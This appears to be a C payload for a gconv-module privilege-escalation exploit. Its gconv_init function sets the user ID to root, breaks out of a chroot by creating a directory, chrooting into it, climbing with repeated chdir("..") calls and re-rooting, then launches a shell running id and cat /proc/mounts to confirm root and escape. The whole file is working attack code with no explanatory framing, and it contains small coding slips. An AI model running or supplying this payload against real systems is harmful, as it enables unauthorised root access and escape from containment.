#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
void gconv() {}

void gconv_init() {
    int dir_fd, x;
    setuid(0);
    mkdir(".42", 0755);
    dir_fd = open(".", O_RDONLY);
    chroot(".42");
    fchdir(dir_fd);
    close(dir_fd);  
    for(x = 0; x < 1000; x++) chdir("..");
    chroot(".");

    char* arr[] = {"sh", "-c", "/usr/bin/id && /usr/bin/cat /proc/mounts", NULL};
    return execv("/bin/sh", arr);
}
